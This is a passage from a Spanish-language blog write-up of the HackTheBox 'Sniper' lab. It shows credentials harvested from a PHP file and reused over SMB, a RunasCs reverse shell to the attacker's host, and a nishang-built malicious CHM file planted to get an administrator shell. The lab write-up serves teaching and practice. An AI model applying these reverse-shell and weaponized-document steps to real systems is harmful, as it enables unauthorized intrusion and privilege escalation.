</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>PS C:<span style="color:#0ff;font-weight:bold">\i</span>netpub<span style="color:#0ff;font-weight:bold">\w</span>wwroot<span style="color:#0ff;font-weight:bold">\b</span>log&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>PS C:<span style="color:#0ff;font-weight:bold">\i</span>netpub<span style="color:#0ff;font-weight:bold">\w</span>wwroot<span style="color:#0ff;font-weight:bold">\b</span>log&gt; whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>nt authority<span style="color:#0ff;font-weight:bold">\i</span>usr</span></span></code></pre></div>
<h1 id="user-pivoting">User Pivoting</h1>
<p>Vemos que hemos ganado acceso como <code>nt authority\iusr</code> , detectamos un usuario a nivel de sistema llamado <code>Chris</code>
<img src="images/Screenshot_19.png" alt="Write-up Image"></p>
<p>En el archivo <code>C:\inetpub\wwwroot\user\db.php</code> encontramos unas credenciales para la base de datos.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>PS C:<span style="color:#0ff;font-weight:bold">\i</span>netpub<span style="color:#0ff;font-weight:bold">\w</span>wwroot<span style="color:#0ff;font-weight:bold">\u</span>ser&gt; <span style="color:#fff;font-weight:bold">type</span> db.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>&lt;?php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>// Enter your Host, username, password, database below.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>// I left password empty because i <span style="color:#fff;font-weight:bold">do</span> not <span style="color:#fff;font-weight:bold">set</span> password on localhost.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>$con = mysqli_connect(<span style="color:#0ff;font-weight:bold">&#34;localhost&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;dbuser&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;36mEAhz/B8xQ~2VM&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;sniper&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>// Check connection
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span><span style="color:#fff;font-weight:bold">if</span> (mysqli_connect_errno())
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>  {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>  <span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#34;Failed to connect to MySQL: &#34;</span> . mysqli_connect_error();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>  }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>?&gt;</span></span></code></pre></div>
<p>Como está el SMB abierto con <code>netexec</code> podemos comprobar que estas credenciales son válidas</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>nxc smb 10.129.229.6 -u Chris -p <span style="color:#0ff;font-weight:bold">&#39;36mEAhz/B8xQ~2VM&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>SMB         10.129.229.6    <span style="color:#ff0;font-weight:bold">445</span>    SNIPER           [*] Windows <span style="color:#ff0;font-weight:bold">10</span> / Server <span style="color:#ff0;font-weight:bold">2019</span> Build <span style="color:#ff0;font-weight:bold">17763</span> x64 (name:SNIPER) (domain:Sniper) (signing:False) (SMBv1:False)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>SMB         10.129.229.6    <span style="color:#ff0;font-weight:bold">445</span>    SNIPER           [+] Sniper<span style="color:#0ff;font-weight:bold">\C</span>hris:36mEAhz/B8xQ~2VM</span></span></code></pre></div>
<p>Para migrar a este usuario podemos subirnos el binario de <code>RunasCs.exe</code> y mandarnos una revshell.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>.<span style="color:#0ff;font-weight:bold">\R</span>unasCs.exe Chris <span style="color:#0ff;font-weight:bold">&#34;36mEAhz/B8xQ~2VM&#34;</span> cmd.exe -r 10.10.14.50:443
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>[+] Running in session <span style="color:#ff0;font-weight:bold">0</span> with process <span style="color:#fff;font-weight:bold">function</span> CreateProcessWithTokenW()
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>[+] Using Station<span style="color:#0ff;font-weight:bold">\D</span>esktop: Service-0x0-3e3$<span style="color:#0ff;font-weight:bold">\D</span>efault
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>[+] Async process <span style="color:#0ff;font-weight:bold">&#39;C:\Windows\system32\cmd.exe&#39;</span> with pid <span style="color:#ff0;font-weight:bold">5328</span> created in background.</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>sudo rlwrap -cEr nc -lvnp <span style="color:#ff0;font-weight:bold">443</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>listening on [any] <span style="color:#ff0;font-weight:bold">443</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>connect to [10.10.14.50] from (UNKNOWN) [10.129.229.6] <span style="color:#ff0;font-weight:bold">49808</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Microsoft Windows [Version 10.0.17763.678]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>(c) <span style="color:#ff0;font-weight:bold">2018</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>C:<span style="color:#0ff;font-weight:bold">\W</span>indows<span style="color:#0ff;font-weight:bold">\s</span>ystem32&gt;whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>sniper<span style="color:#0ff;font-weight:bold">\c</span>hris</span></span></code></pre></div>
<p>Y podemos leer la flag de usuario</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\C</span>hris<span style="color:#0ff;font-weight:bold">\D</span>esktop&gt;type user.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span><span style="color:#fff;font-weight:bold">type</span> user.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>6ca87a0f671c798c...</span></span></code></pre></div>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>En el directorio de descargas de este usuario encontramos lo siguiente.
<img src="images/Screenshot_21.png" alt="Write-up Image"></p>
<blockquote>
<p>Un archivo CHM (Compiled HTML Help) es un formato de archivo de ayuda desarrollado por Microsoft, comúnmente utilizado para la documentación de software. Estos archivos están diseñados para almacenar documentación en un formato compacto y de fácil acceso. Los archivos CHM fueron especialmente populares en la era de Windows 98 y continuaron siendo ampliamente usados en versiones posteriores de Windows.</p>
</blockquote>
<p>En la raíz del sistema detectamos un directorio un tanto extraño llamado <code>Docs</code>
<img src="images/Screenshot_20.png" alt="Write-up Image"></p>
<p>Vemos una nota que dicta lo siguiente</p>






<pre tabindex="0"><code>C:\Docs&gt;type note.txt
type note.txt
Hi Chris,
	Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you&#39;ve prepared the documentation for our new app. Drop it here when you&#39;re done with it.

Regards,
Sniper CEO.</code></pre>
<p>El CEO está esperando la documentación del sistema y supongo que esperará un archivo CHM, podríamos crear un CHM.</p>
<p>Me encontré el siguiente post sobre como conseguir ejecución de comandos a través de un archivo CHM malicioso y resulta que <code>nishang</code> tiene un script para crear un CHM malicioso.
<a href="https://medium.com/r3d-buck3t/weaponize-chm-files-with-powershell-nishang-c98b93f79f1e">https://medium.com/r3d-buck3t/weaponize-chm-files-with-powershell-nishang-c98b93f79f1e</a></p>
<p>También debemos instalar HTML Help Workshop que sirve para compilar el archivo CHM, el problema es que este archivo está eliminado a día de hoy de la documentación oficial de Windows 10.</p>
<p>Podemos utilizar WaybackMachine para <a href="http://web.archive.org/web/20160201063255/http://download.microsoft.com/download/0/A/9/0A939EF6-E31C-430F-A3DF-DFAE7960D564/htmlhelp.exe">descargar el instalador</a></p>
<p>Una vez instalado podemos crear nuestro CHM malicioso&hellip;
<img src="images/Screenshot_23.png" alt="Write-up Image"></p>
<p>Nos copiamos el binario de <code>nc.exe</code> y el archivo <code>doc.chm</code> en la máquina víctima</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\C</span>hris<span style="color:#0ff;font-weight:bold">\D</span>esktop&gt;dir
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>dir
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span> Volume in drive C has no label.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span> Volume Serial Number is AE98-73A8
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span> Directory of C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\C</span>hris<span style="color:#0ff;font-weight:bold">\D</span>esktop
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>08/23/2024  08:03 PM    &lt;DIR&gt;          .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>08/23/2024  08:03 PM    &lt;DIR&gt;          ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>08/23/2024  08:01 PM            13,448 d573913120ef8d81e901bd7b3ae2701760008cb2.key
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>08/23/2024  08:01 PM            13,448 doc.chm
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>08/23/2024  08:03 PM            28,160 nc.exe
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>08/23/2024  06:27 PM                <span style="color:#ff0;font-weight:bold">34</span> user.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>               <span style="color:#ff0;font-weight:bold">4</span> File(s)         55,090 bytes
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>               <span style="color:#ff0;font-weight:bold">2</span> Dir(s)   2,414,661,632 bytes free</span></span></code></pre></div>
<p>Copiamos el <code>nc.exe</code> a la ruta que hemos especificado en el payload al generar el archivo CHM</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\C</span>hris<span style="color:#0ff;font-weight:bold">\D</span>esktop&gt;copy nc.exe C:<span style="color:#0ff;font-weight:bold">\W</span>indows<span style="color:#0ff;font-weight:bold">\S</span>ystem32<span style="color:#0ff;font-weight:bold">\s</span>pool<span style="color:#0ff;font-weight:bold">\d</span>rivers<span style="color:#0ff;font-weight:bold">\c</span>olor<span style="color:#0ff;font-weight:bold">\n</span>c.exe
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>copy nc.exe C:<span style="color:#0ff;font-weight:bold">\W</span>indows<span style="color:#0ff;font-weight:bold">\S</span>ystem32<span style="color:#0ff;font-weight:bold">\s</span>pool<span style="color:#0ff;font-weight:bold">\d</span>rivers<span style="color:#0ff;font-weight:bold">\c</span>olor<span style="color:#0ff;font-weight:bold">\n</span>c.exe
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>        <span style="color:#ff0;font-weight:bold">1</span> file(s) copied.</span></span></code></pre></div>
<p>Y copiamos el archivo CHM malicioso al directorio donde estaba la nota&hellip;</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\C</span>hris<span style="color:#0ff;font-weight:bold">\D</span>esktop&gt;copy doc.chm C:<span style="color:#0ff;font-weight:bold">\D</span>ocs<span style="color:#0ff;font-weight:bold">\d</span>oc.chm
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>copy doc.chm C:<span style="color:#0ff;font-weight:bold">\D</span>ocs<span style="color:#0ff;font-weight:bold">\d</span>oc.chm
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>        <span style="color:#ff0;font-weight:bold">1</span> file(s) copied.</span></span></code></pre></div>
<p>Y si nos ponemos en escucha con <code>netcat</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>sudo rlwrap -cEr nc -lvnp <span style="color:#ff0;font-weight:bold">443</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>listening on [any] <span style="color:#ff0;font-weight:bold">443</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>connect to [10.10.14.50] from (UNKNOWN) [10.129.229.6] <span style="color:#ff0;font-weight:bold">49818</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Windows PowerShell 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>Copyright (C) Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>PS C:<span style="color:#0ff;font-weight:bold">\W</span>indows<span style="color:#0ff;font-weight:bold">\s</span>ystem32&gt; whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>sniper<span style="color:#0ff;font-weight:bold">\a</span>dministrator</span></span></code></pre></div>
<p>Podemos leer la flag de <code>root</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>PS C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\A</span>dministrator<span style="color:#0ff;font-weight:bold">\D</span>esktop&gt; <span style="color:#fff;font-weight:bold">type</span> root.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span><span style="color:#fff;font-weight:bold">type</span> root.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>b7b8de1f25db0cb...</span></span></code></pre></div>
<p>¡Y ya estaría!</p>
<p>Happy Hacking! 🚀</p>

  </content>
  <p>
    
      <a href="/tags/hackthebox/">#HackTheBox</a>&nbsp;&nbsp;
    
      <a href="/tags/sniper/">#Sniper</a>&nbsp;&nbsp;
    
      <a href="/tags/writeup/">#Writeup</a>&nbsp;&nbsp;
    
      <a href="/tags/cybersecurity/">#Cybersecurity</a>&nbsp;&nbsp;
    
      <a href="/tags/penetration-testing/">#Penetration Testing</a>&nbsp;&nbsp;
    
      <a href="/tags/ctf/">#CTF</a>&nbsp;&nbsp;
    
      <a href="/tags/reverse-shell/">#Reverse Shell</a>&nbsp;&nbsp;
    
      <a href="/tags/privilege-escalation/">#Privilege Escalation</a>&nbsp;&nbsp;
    
      <a href="/tags/rce/">#RCE</a>&nbsp;&nbsp;
    
      <a href="/tags/exploit/">#Exploit</a>&nbsp;&nbsp;
    
      <a href="/tags/windows/">#Windows</a>&nbsp;&nbsp;
    
      <a href="/tags/local-file-inclusion/">#Local File Inclusion</a>&nbsp;&nbsp;
    
      <a href="/tags/abusing-php-session-temp-files/">#Abusing PHP Session Temp Files</a>&nbsp;&nbsp;
    
      <a href="/tags/bypassing/">#Bypassing</a>&nbsp;&nbsp;
    
      <a href="/tags/information-leakage/">#Information Leakage</a>&nbsp;&nbsp;
    
      <a href="/tags/user-pivoting/">#User Pivoting</a>&nbsp;&nbsp;
    
      <a href="/tags/weaponizing-chm-file/">#Weaponizing CHM File</a>&nbsp;&nbsp;
    
  </p>

    </main>
    <footer>
      
  <span>© 2024 pointedsec</span>



    </footer>

    
</body>
</html>
